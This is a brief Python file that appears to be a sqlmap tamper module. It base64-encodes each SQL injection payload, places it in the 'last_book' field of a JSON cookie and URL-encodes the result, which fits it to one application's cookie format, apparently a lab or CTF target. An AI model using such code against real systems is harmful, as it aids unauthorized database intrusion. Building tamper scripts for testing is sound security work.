#!/usr/bin/env python

from lib.core.enums import PRIORITY
import re
from lib.core.convert import encodeBase64
import urllib.parse

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    
    #original cookie
    cookie_data = '{"last_book":"Mg==","userchl2":""}'
    x = encodeBase64(payload, binary=False)
    tmp = cookie_data.replace("Mg==",x)
    return urllib.parse.quote(tmp)
